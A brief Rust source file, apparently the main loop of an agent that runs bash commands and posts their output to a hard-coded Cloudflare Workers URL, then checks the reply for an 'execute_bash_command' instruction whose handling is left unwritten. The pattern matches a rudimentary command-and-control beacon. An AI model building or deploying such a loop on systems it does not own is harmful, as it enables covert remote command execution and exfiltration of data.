mod command_executor;
mod worker_communication;

#[tokio::main]
async fn main() {
    let worker_url = "https://serverworker.adoba.workers.dev/";
    loop {
        let output = command_executor::execute_bash_command(true);

        if !output.status.success() {
            println!("Command execution failed: {}", String::from_utf8_lossy(&output.stderr));
            continue;
        }

        let command_output = String::from_utf8_lossy(&output.stdout).to_string();

        // Send the command output to the Worker
        let response = match worker_communication::send_data_request(&worker_url, &command_output).await {
            Ok(response) => response,
            Err(e) => {
                println!("Error: {}", e);
                continue;
            }
        };

        // Check the response from the Worker
        if response == "execute_bash_command" {
            // Handle the response as needed
        } else {
            // Handle other responses as needed
        }
    }
}